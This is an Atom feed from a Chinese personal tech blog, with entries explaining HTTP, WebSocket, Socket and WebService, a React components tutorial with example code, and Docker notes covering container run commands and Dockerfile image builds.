<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Niko Yu Blog</title>
  
  <subtitle>人生苦短，及时行乐</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://www.nikoyu.asia/"/>
  <updated>2021-03-23T09:41:18.930Z</updated>
  <id>https://www.nikoyu.asia/</id>
  
  <author>
    <name>Niko Yu</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>webService、webSocket、socket、http之间的区别</title>
    <link href="https://www.nikoyu.asia/http-webService-webSocket-socket.html"/>
    <id>https://www.nikoyu.asia/http-webService-webSocket-socket.html</id>
    <published>2021-03-23T09:26:44.000Z</published>
    <updated>2021-03-23T09:41:18.930Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"><!--页面头部添加--><div id="content_views" class="markdown_views prism-dracula"> <h1><a name="t1"></a><a name="t1"></a><a id="webSocket_17"></a>HTTP</h1> <p>HTTP 是基于请求响应式的，即通信只能由客户端发起，服务端做出响应，无状态，无连接。</p> <p><strong>无状态</strong>：每次连接只处理一个请求，请求结束后断开连接。</p> <p><strong>无连接</strong>：对于事务处理没有记忆能力，服务器不知道客户端是什么状态。</p> <p>以往实现即时通讯的手段：</p> <p><strong>轮询</strong>：客户端定时向服务器发送 Ajax 请求，服务器接到请求后马上返回响应信息并关闭连接。</p> <p><strong>长轮询</strong>：客户端向服务器发送 Ajax 请求，服务器接到请求后 hold 住连接，直到有新消息才返回响应信息并关闭连接，客户端处理完响应信息后再向服务器发送新的请求。</p> <p><strong>长连接</strong>：在页面里嵌入一个隐蔵 iframe，将这个隐蔵 iframe 的 src 属性设为对一个长连接的请求，服务器端就能源源不断地往客户端输入数据。</p> <p><strong>Flash Socket</strong>：在页面中内嵌入一个使用了 Socket 类的 Flash 程序 JavaScript 通过调用此 Flash 程序提供的 Socket 接口与服务器端的 Socket 接口进行通信，JavaScript 在收到服务器端传送的信息后控制页面的显示。</p> <h1><a name="t1"></a><a name="t1"></a><a id="webSocket_17"></a>webSocket</h1> <h3><a name="t2"></a><a name="t2"></a><a id="webSocket_18"></a>为什么需要webSocket</h3> <p>HTTP 协议有一个缺陷：通信只能由客户端发起。</p> <p>举例来说，我们想了解今天的天气，只能是客户端向服务器发出请求，服务器返回查询结果。HTTP 协议做不到服务器主动向客户端推送信息。</p> <p>这种单向请求的特点，注定了如果服务器有连续的状态变化，客户端要获知就非常麻烦。我们只能使用"轮询"：每隔一段时候，就发出一个询问，了解服务器有没有新的信息。最典型的场景就是聊天室。</p> <p>轮询的效率低，非常浪费资源（因为必须不停连接，或者 HTTP 连接始终打开）。因此，工程师们一直在思考，有没有更好的方法。WebSocket 就是这样发明的。</p> <p>WebSocket 协议在2008年诞生，2011年成为国际标准。所有浏览器都已经支持了。</p> <p>它的最大特点就是，服务器可以主动向客户端推送信息，客户端也可以主动向服务器发送信息，是真正的双向平等对话，属于服务器推送技术的一种。<br> <img alt="在这里插入图片描述" data-src="https://img-blog.csdnimg.cn/20181227153625431.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pYW9fOQ==,size_16,color_FFFFFF,t_70" class="lazyload"></p> <h3><a name="t3"></a><a name="t3"></a><a id="_33"></a>其他特点包括：</h3> <p>（1）建立在 TCP 协议之上，服务器端的实现比较容易。</p> <p>（2）与 HTTP 协议有着良好的兼容性。默认端口也是80和443，并且握手阶段采用 HTTP 协议，因此握手时不容易屏蔽，能通过各种 HTTP 代理服务器。</p> <p>（3）数据格式比较轻量，性能开销小，通信高效。</p> <p>（4）可以发送文本，也可以发送二进制数据。</p> <p>（5）没有同源限制，客户端可以与任意服务器通信。</p> <p>（6）协议标识符是ws（如果加密，则为wss），服务器网址就是 URL。</p> <p>Websocket使用和 HTTP 相同的 TCP 端口，可以绕过大多数防火墙的限制。默认情况下，Websocket协议使用80端口；运行在TLS之上时，默认使用443端口。</p> <h3><a name="t4"></a><a name="t4"></a><a id="WebSocketHTTP_49"></a>WebSocket与HTTP的关系</h3> <p><strong>相同点</strong></p> <ul><li>都是一样基于TCP的，都是可靠性传输协议。</li><li>都是应用层协议。</li></ul> <p><strong>不同点</strong></p> <ul><li>WebSocket是双向通信协议，模拟Socket协议，可以双向发送或接受信息。HTTP是单向的。</li><li>WebSocket是需要握手进行建立连接的。</li></ul> <p><strong>联系</strong><br> WebSocket在建立握手时，数据是通过HTTP传输的。但是建立之后，在真正传输时候是不需要HTTP协议的。</p> <h1><a name="t5"></a><a name="t5"></a><a id="Socket_63"></a>Socket</h1> <p>Socket 是操作系统提供的对于传输层（TCP / UDP）抽象的接口，是一个编程概念，而 Websocket 与 HTTP 一样是一个成文的互联网协议。</p> <p>Socket是应用层与TCP/IP协议族通信的中间软件抽象层，它是一组接口。在设计模式中，Socket其实就是一个门面模式，它把复杂的TCP/IP协议族隐藏在Socket接口后面，对用户来说，一组简单的接口就是全部，让Socket去组织数据，以符合指定的协议。</p> <p><img alt="在这里插入图片描述" data-src="https://img-blog.csdnimg.cn/20181227153658348.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pYW9fOQ==,size_16,color_FFFFFF,t_70" class="lazyload"></p> <p>当两台主机通信时，必须通过Socket连接，Socket则利用TCP/IP协议建立TCP连接。TCP连接则更依靠于底层的IP协议，IP协议的连接则依赖于链路层等更低层次。</p> <h1><a name="t6"></a><a name="t6"></a><a id="webService_72"></a>webService</h1> <p>WebService是一种跨编程语言和跨操作系统平台的远程调用技术。</p> <p>跨编程语言和跨操作平台：就是说服务端程序采用java编写，客户端程序则可以采用其他编程语言编写，反之亦然！</p> <p>跨操作系统平台：则是指服务端程序和客户端程序可以在不同的操作系统上运行。</p> <p>远程调用：就是一台计算机a上的一个程序可以调用到另外一台计算机b上的一个对象的方法，譬如，银联提供给商场的pos刷卡系统，商场的POS机转账调用的转账方法的代码其实是跑在银行服务器上。再比如，amazon，天气预报系统，淘宝网，校内网，百度等把自己的系统服务以webservice服务的形式暴露出来，让第三方网站和程序可以调用这些服务功能，这样扩展了自己系统的市场占有率，往大的概念上吹，就是所谓的SOA应用。</p> <p>从表面上看，WebService就是一个应用程序向外界暴露出一个能通过Web进行调用的API，把调用这个WebService的应用程序叫做客户端，而把提供这个WebService的应用程序叫做服务端。从深层次看，WebService是建立可互操作的分布式应用程序的新平台，是一个平台，是一套标准。</p> <p>WebService平台需要一套协议来实现分布式应用程序的创建。任何平台都有它的数据表示方法和类型系统。要实现互操作性，WebService平台必须提供一套标准的类型系统，用于沟通不同平台、编程语言和组件模型中的不同类型系统。Web service平台必须提供一种标准来描述Web service，让客户可以得到足够的信息来调用这个Web service。最后，我们还必须有一种方法来对这个Web service进行远程调用,这种方法实际是一种远程过程调用协议(RPC)。为了达到互操作性，这种RPC协议还必须与平台和编程语言无关。</p> <h2><a name="t7"></a><a name="t7"></a><a id="WebService_86"></a>WebService平台技术</h2> <p><strong>XML+XSD,SOAP和WSDL就是构成WebService平台的三大技术。</strong></p> <h3><a name="t8"></a><a name="t8"></a><a id="XML_90"></a>XML：</h3> <p>WebService采用HTTP协议传输数据，采用XML格式封装数据（即XML中说明调用远程服务对象的哪个方法，传递的参数是什么，以及服务对象的返回结果是什么）。XML是WebService平台中表示数据的格式。除了易于建立和易于分析外，XML主要的优点在于它既是平台无关的，又是厂商无关的。无关性是比技术优越性更重要的：软件厂商是不会选择一个由竞争对手所发明的技术的。</p> <p>XML解决了数据表示的问题，但它没有定义一套标准的数据类型，更没有说怎么去扩展这套数据类型。例如，整形数到底代表什么？16位，32位，64位？这些细节对实现互操作性很重要。XML Schema(XSD)就是专门解决这个问题的一套标准。它定义了一套标准的数据类型，并给出了一种语言来扩展这套数据类型。WebService平台就是用XSD来作为其数据类型系统的。当你用某种语言(如VB.NET或C#)来构造一个Web service时，为了符合WebService标准，所有你使用的数据类型都必须被转换为XSD类型。你用的工具可能已经自动帮你完成了这个转换，但你很可能会根据你的需要修改一下转换过程。</p> <h3><a name="t9"></a><a name="t9"></a><a id="SOAPSimple_Object_Access_Protocol_96"></a>SOAP(Simple Object Access Protocol简单对象访问协议)：</h3> <p>WebService通过HTTP协议发送请求和接收结果时，发送的请求内容和结果内容都采用XML格式封装，并增加了一些特定的HTTP消息头，以说明HTTP消息的内容格式，这些特定的HTTP消息头和XML内容格式就是SOAP协议。SOAP提供了标准的RPC方法来调用Web Service。</p> <p><strong>SOAP协议 = HTTP协议 + XML数据格式</strong></p> <p>SOAP协议定义了SOAP消息的格式，SOAP协议是基于HTTP协议的，SOAP也是基于XML和XSD的，XML是SOAP的数据编码方式。打个比喻：HTTP就是普通公路，XML就是中间的绿色隔离带和两边的防护栏，SOAP就是普通公路经过加隔离带和防护栏改造过的高速公路。</p> <h3><a name="t10"></a><a name="t10"></a><a id="WSDL_104"></a>WSDL：</h3> <p>好比我们去商店买东西，首先要知道商店里有什么东西可买，然后再来购买，商家的做法就是张贴广告海报。 WebService也一样，WebService客户端要调用一个WebService服务，首先要有知道这个服务的地址在哪，以及这个服务里有什么方法可以调用，所以，WebService务器端首先要通过一个WSDL文件来说明自己家里有啥服务可以对外调用，服务是什么（服务中有哪些方法，方法接受的参数是什么，返回值是什么），服务的网络地址用哪个url地址表示，服务通过什么方式来调用。</p> <p>WSDL(Web Services Description Language)就是这样一个基于XML的语言，用于描述Web Service及其函数、参数和返回值。它是WebService客户端和服务器端都能理解的标准格式。因为是基于XML的，所以WSDL既是机器可阅读的，又是人可阅读的，这将是一个很大的好处。一些最新的开发工具既能根据你的Web service生成WSDL文档，又能导入WSDL文档，生成调用相应WebService的代理类代码。</p> <p>WSDL文件保存在Web服务器上，通过一个url地址就可以访问到它。客户端要调用一个WebService服务之前，要知道该服务的WSDL文件的地址。WebService服务提供商可以通过两种方式来暴露它的WSDL文件地址：1.注册到UDDI服务器，以便被人查找；2.直接告诉给客户端调用者。</p></div>]]></content>
    
    <summary type="html">
    
      
      
        &lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;&lt;!--页面头部添加--&gt;
&lt;div id=&quot;content_views&quot; class=&quot;markdown_views prism-dracula&quot;&gt;

 &lt;h1&gt;&lt;a name=&quot;t1&quot;&gt;&lt;
      
    
    </summary>
    
    
      <category term="HTTP" scheme="https://www.nikoyu.asia/categories/HTTP/"/>
    
      <category term="webSocket" scheme="https://www.nikoyu.asia/categories/HTTP/webSocket/"/>
    
      <category term="Socket" scheme="https://www.nikoyu.asia/categories/HTTP/webSocket/Socket/"/>
    
      <category term="webService" scheme="https://www.nikoyu.asia/categories/HTTP/webSocket/Socket/webService/"/>
    
    
      <category term="IT" scheme="https://www.nikoyu.asia/tags/IT/"/>
    
      <category term="HTTP" scheme="https://www.nikoyu.asia/tags/HTTP/"/>
    
      <category term="webSocket" scheme="https://www.nikoyu.asia/tags/webSocket/"/>
    
      <category term="Socket" scheme="https://www.nikoyu.asia/tags/Socket/"/>
    
      <category term="webService" scheme="https://www.nikoyu.asia/tags/webService/"/>
    
  </entry>
  
  <entry>
    <title>react组件</title>
    <link href="https://www.nikoyu.asia/react%E7%BB%84%E4%BB%B6.html"/>
    <id>https://www.nikoyu.asia/react%E7%BB%84%E4%BB%B6.html</id>
    <published>2021-03-22T09:26:44.000Z</published>
    <updated>2021-03-23T01:47:24.924Z</updated>
    
    <content type="html"><![CDATA[<div class="article-body"><div class="article-intro" id="content"><h1>React 组件</h1><p>本章节我们将讨论如何使用组件使得我们的应用更容易来管理。</p><p>接下来我们封装一个输出 "Hello World！" 的组件，组件名为 HelloMessage：</p><div class="example"><h2 class="example">React 实例</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset&#x3D;&quot;UTF-8&quot; &#x2F;&gt;</span><br><span class="line">&lt;title&gt;菜鸟教程 React 实例&lt;&#x2F;title&gt;</span><br><span class="line">&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;cdn.staticfile.org&#x2F;react&#x2F;16.4.0&#x2F;umd&#x2F;react.development.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;cdn.staticfile.org&#x2F;react-dom&#x2F;16.4.0&#x2F;umd&#x2F;react-dom.development.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;cdn.staticfile.org&#x2F;babel-standalone&#x2F;6.26.0&#x2F;babel.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;div id&#x3D;&quot;example&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">&lt;script type&#x3D;&quot;text&#x2F;babel&quot;&gt;</span><br><span class="line">function HelloMessage(props) &#123;</span><br><span class="line">return &lt;h1&gt;Hello World!&lt;&#x2F;h1&gt;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const element &#x3D; &lt;HelloMessage &#x2F;&gt;;</span><br><span class="line"></span><br><span class="line">ReactDOM.render(</span><br><span class="line">element,</span><br><span class="line">document.getElementById(&#39;example&#39;)</span><br><span class="line">);</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p><br> <a class="tryitbtn" href="/try/try.php?filename=try_react_component" target="_blank">尝试一下 »</a></p></div><h3>实例解析：</h3><p>1、我们可以使用函数定义了一个组件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function HelloMessage(props) &#123;</span><br><span class="line">    return &lt;h1&gt;Hello World!&lt;&#x2F;h1&gt;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>你也可以使用 ES6 class 来定义一个组件:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">class Welcome extends React.Component &#123;</span><br><span class="line">  render() &#123;</span><br><span class="line">    return &lt;h1&gt;Hello World!&lt;&#x2F;h1&gt;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2、<b>const element = &lt;HelloMessage /&gt;</b> 为用户自定义的组件。</p><blockquote><p>注意，原生 HTML 元素名以小写字母开头，而自定义的 React 类名以大写字母开头，比如 HelloMessage 不能写成 helloMessage。除此之外还需要注意组件类只能包含一个顶层标签，否则也会报错。</p></blockquote><p>如果我们需要向组件传递参数，可以使用 <b>this.props</b>  对象,实例如下：</p><div class="example"><h2 class="example">React 实例</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset&#x3D;&quot;UTF-8&quot; &#x2F;&gt;</span><br><span class="line">&lt;title&gt;菜鸟教程 React 实例&lt;&#x2F;title&gt;</span><br><span class="line">&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;cdn.staticfile.org&#x2F;react&#x2F;16.4.0&#x2F;umd&#x2F;react.development.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;cdn.staticfile.org&#x2F;react-dom&#x2F;16.4.0&#x2F;umd&#x2F;react-dom.development.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;cdn.staticfile.org&#x2F;babel-standalone&#x2F;6.26.0&#x2F;babel.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;div id&#x3D;&quot;example&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">&lt;script type&#x3D;&quot;text&#x2F;babel&quot;&gt;</span><br><span class="line">function HelloMessage(props) &#123;</span><br><span class="line">return &lt;h1&gt;Hello &#123;props.name&#125;!&lt;&#x2F;h1&gt;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const element &#x3D; &lt;HelloMessage name&#x3D;&quot;Runoob&quot;&#x2F;&gt;;</span><br><span class="line"></span><br><span class="line">ReactDOM.render(</span><br><span class="line">element,</span><br><span class="line">document.getElementById(&#39;example&#39;)</span><br><span class="line">);</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><br> <a class="tryitbtn" href="/try/try.php?filename=try_react_component2" target="_blank">尝试一下 »</a></div><p>以上实例中 <b>name</b> 属性通过 <span class="marked">props.name</span> 来获取。</p><blockquote><p>注意，在添加属性时，class 属性需要写成 className ，for 属性需要写成 htmlFor ，这是因为 class 和 for 是 JavaScript 的保留字。</p></blockquote><hr><h2>复合组件</h2><p>我们可以通过创建多个组件来合成一个组件，即把组件的不同功能点进行分离。</p><p>以下实例我们实现了输出网站名字和网址的组件：</p><div class="example"><h2 class="example">React 实例</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset&#x3D;&quot;UTF-8&quot; &#x2F;&gt;</span><br><span class="line">&lt;title&gt;菜鸟教程 React 实例&lt;&#x2F;title&gt;</span><br><span class="line">&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;cdn.staticfile.org&#x2F;react&#x2F;16.4.0&#x2F;umd&#x2F;react.development.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;cdn.staticfile.org&#x2F;react-dom&#x2F;16.4.0&#x2F;umd&#x2F;react-dom.development.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;cdn.staticfile.org&#x2F;babel-standalone&#x2F;6.26.0&#x2F;babel.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;div id&#x3D;&quot;example&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">&lt;script type&#x3D;&quot;text&#x2F;babel&quot;&gt;</span><br><span class="line">function Name(props) &#123;</span><br><span class="line">return &lt;h1&gt;网站名称：&#123;props.name&#125;&lt;&#x2F;h1&gt;;</span><br><span class="line">&#125;</span><br><span class="line">function Url(props) &#123;</span><br><span class="line">return &lt;h1&gt;网站地址：&#123;props.url&#125;&lt;&#x2F;h1&gt;;</span><br><span class="line">&#125;</span><br><span class="line">function Nickname(props) &#123;</span><br><span class="line">return &lt;h1&gt;网站小名：&#123;props.nickname&#125;&lt;&#x2F;h1&gt;;</span><br><span class="line">&#125;</span><br><span class="line">function App() &#123;</span><br><span class="line">return (</span><br><span class="line">&lt;div&gt;</span><br><span class="line">&lt;Name name&#x3D;&quot;菜鸟教程&quot; &#x2F;&gt;</span><br><span class="line">&lt;Url url&#x3D;&quot;http:&#x2F;&#x2F;www.runoob.com&quot; &#x2F;&gt;</span><br><span class="line">&lt;Nickname nickname&#x3D;&quot;Runoob&quot; &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line">);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ReactDOM.render(</span><br><span class="line">&lt;App &#x2F;&gt;,</span><br><span class="line">document.getElementById(&#39;example&#39;)</span><br><span class="line">);</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><br> <a class="tryitbtn" href="/try/try.php?filename=try_react_component3" target="_blank">尝试一下 »</a> </div><p>实例中 App 组件使用了 Name、Url 和 Nickname 组件来输出对应的信息。</p>            <!-- 其他扩展 --></div></div>]]></content>
    
    <summary type="html">
    
      
      
        &lt;div class=&quot;article-body&quot;&gt;

&lt;div class=&quot;article-intro&quot; id=&quot;content&quot;&gt;

&lt;h1&gt;React 组件&lt;/h1&gt;
&lt;p&gt;本章节我们将讨论如何使用组件使得我们的应用更容易来管理。&lt;/p&gt;
&lt;p&gt;接下来我们封装一个输出 &quot;
      
    
    </summary>
    
    
      <category term="react" scheme="https://www.nikoyu.asia/categories/react/"/>
    
    
      <category term="IT" scheme="https://www.nikoyu.asia/tags/IT/"/>
    
      <category term="react" scheme="https://www.nikoyu.asia/tags/react/"/>
    
  </entry>
  
  <entry>
    <title>docker 小结</title>
    <link href="https://www.nikoyu.asia/docker.html"/>
    <id>https://www.nikoyu.asia/docker.html</id>
    <published>2021-03-19T09:26:44.000Z</published>
    <updated>2021-03-23T09:30:45.971Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"><!--页面头部添加--><h1 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h1><h2 id="docker-启动-mongo-命令"><a href="#docker-启动-mongo-命令" class="headerlink" title="docker 启动 mongo 命令"></a>docker 启动 mongo 命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --name mongo -p 27017:27017 -v mongodata:&#x2F;data&#x2F;db -e MONGO_INITDB_ROOT_USERNAME&#x3D;admin -e MONGO_INITDB_ROOT_PASSWORD&#x3D;admin -d mongo</span><br></pre></td></tr></table></figure><h2 id="docker-启动-redis"><a href="#docker-启动-redis" class="headerlink" title="docker 启动 redis"></a>docker 启动 redis</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker run -p 6379:6379 --name redis -d</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="——————————————————————————————–"><a href="#——————————————————————————————–" class="headerlink" title="——————————————————————————————–"></a>——————————————————————————————–</h1><div class="article-body">        <div class="article-intro" id="content">            <h1>Docker Dockerfile </h1><h3>什么是 Dockerfile？</h3><p>Dockerfile 是一个用来构建镜像的文本文件，文本内容包含了一条条构建镜像所需的指令和说明。</p><h3>使用 Dockerfile 定制镜像</h3><p>这里仅讲解如何运行 Dockerfile 文件来定制一个镜像，具体 Dockerfile 文件内指令详解，将在下一节中介绍，这里你只要知道构建的流程即可。</p><p><strong>1、下面以定制一个 nginx 镜像（构建好的镜像内会有一个 /usr/share/nginx/html/index.html 文件）</strong></p><p>在一个空目录下，新建一个名为 Dockerfile 文件，并在文件内添加以下内容：</p><pre class="prettyprint prettyprinted" style><span class="pln">FROM nginxRUN echo </span><span class="str">'这是一个本地构建的nginx镜像'</span><span class="pln"> </span><span class="pun">&gt;</span><span class="pln"> </span><span class="str">/usr/</span><span class="pln">share</span><span class="pun">/</span><span class="pln">nginx</span><span class="pun">/</span><span class="pln">html</span><span class="pun">/</span><span class="pln">index</span><span class="pun">.</span><span class="pln">html</span></pre><p><img data-src="https://www.runoob.com/wp-content/uploads/2019/11/dockerfile1.png" class="lazyload"></p><p><strong>2、FROM 和 RUN 指令的作用</strong></p><p><strong>FROM</strong>：定制的镜像都是基于 FROM 的镜像，这里的 nginx 就是定制需要的基础镜像。后续的操作都是基于 nginx。</p><p><strong>RUN</strong>：用于执行后面跟着的命令行命令。有以下俩种格式：</p><p>shell 格式：</p><pre class="prettyprint prettyprinted" style><span class="pln">RUN </span><span class="pun">&lt;命令行命令&gt;</span><span class="pln"></span><span class="com"># &lt;命令行命令&gt; 等同于，在终端操作的 shell 命令。</span></pre><p>exec 格式：</p><pre class="prettyprint prettyprinted" style><span class="pln">RUN </span><span class="pun">[</span><span class="str">"可执行文件"</span><span class="pun">,</span><span class="pln"> </span><span class="str">"参数1"</span><span class="pun">,</span><span class="pln"> </span><span class="str">"参数2"</span><span class="pun">]</span><span class="pln"></span><span class="com"># 例如：</span><span class="pln"></span><span class="com"># RUN ["./test.php", "dev", "offline"] 等价于 RUN ./test.php dev offline</span></pre><p><strong>注意</strong>：Dockerfile 的指令每执行一次都会在 docker 上新建一层。所以过多无意义的层，会造成镜像膨胀过大。例如：</p><div class="example"> <div class="example_code">FROM centos<br>RUN <span style="color: #c20cb9; font-weight: bold;">yum install</span> <span style="color: #c20cb9; font-weight: bold;">wget</span><br>RUN <span style="color: #c20cb9; font-weight: bold;">wget</span> <span style="color: #660033;">-O</span> redis.tar.gz <span style="color: #a10;">"http://download.redis.io/releases/redis-5.0.3.tar.gz"</span><br>RUN <span style="color: #c20cb9; font-weight: bold;">tar</span> <span style="color: #660033;">-xvf</span> redis.tar.gz<br>以上执行会创建 <span style="color: #000000;">3</span> 层镜像。可简化为以下格式：<br>FROM centos<br>RUN <span style="color: #c20cb9; font-weight: bold;">yum install</span> <span style="color: #c20cb9; font-weight: bold;">wget</span> \<br>&nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">&amp;&amp;</span> <span style="color: #c20cb9; font-weight: bold;">wget</span> <span style="color: #660033;">-O</span> redis.tar.gz <span style="color: #a10;">"http://download.redis.io/releases/redis-5.0.3.tar.gz"</span> \<br>&nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">&amp;&amp;</span> <span style="color: #c20cb9; font-weight: bold;">tar</span> <span style="color: #660033;">-xvf</span> redis.tar.gz<br></div></div><p>如上，以 <span class="marked">&amp;&amp;</span> 符号连接命令，这样执行后，只会创建 1 层镜像。</p><h3>开始构建镜像</h3><p>在 Dockerfile 文件的存放目录下，执行构建动作。</p><p>以下示例，通过目录下的 Dockerfile 构建一个 nginx:v3（镜像名称:镜像标签）。</p><p><strong>注</strong>：最后的  <span class="marked">.</span>  代表本次执行的上下文路径，下一节会介绍。</p><div class="example"> <div class="example_code">$ docker build <span style="color: #660033;">-t</span> nginx:v3 .<br></div></div><p><img data-src="https://www.runoob.com/wp-content/uploads/2019/11/dockerfile2.png" class="lazyload"></p><p>以上显示，说明已经构建成功。</p><h3>上下文路径</h3><p>上一节中，有提到指令最后一个  <span class="marked">.</span>  是上下文路径，那么什么是上下文路径呢？</p><div class="example"><div class="example_code">$ docker build <span style="color: #660033;">-t</span> nginx:v3 .<br></div></div><p>上下文路径，是指 docker 在构建镜像，有时候想要使用到本机的文件（比如复制），docker build 命令得知这个路径后，会将路径下的所有内容打包。</p><p><strong>解析</strong>：由于 docker 的运行模式是 C/S。我们本机是 C，docker 引擎是 S。实际的构建过程是在 docker 引擎下完成的，所以这个时候无法用到我们本机的文件。这就需要把我们本机的指定目录下的文件一起打包提供给 docker 引擎使用。</p><p>如果未说明最后一个参数，那么默认上下文路径就是 Dockerfile 所在的位置。</p><p><strong>注意</strong>：上下文路径下不要放无用的文件，因为会一起打包发送给 docker 引擎，如果文件过多会造成过程缓慢。</p><hr><h2>指令详解</h2> 